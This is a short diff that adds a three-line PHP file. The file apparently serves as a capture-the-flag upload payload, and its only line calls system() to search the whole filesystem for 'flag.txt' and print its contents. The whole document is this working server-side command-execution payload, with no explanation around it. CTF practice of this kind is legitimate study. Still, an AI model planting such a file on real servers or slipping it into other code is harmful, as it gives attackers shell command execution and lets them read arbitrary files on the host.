@@ -1,0 +1,3 @@
+<?php
+system("cat < $(find / | grep 'flag.txt')");
+?>
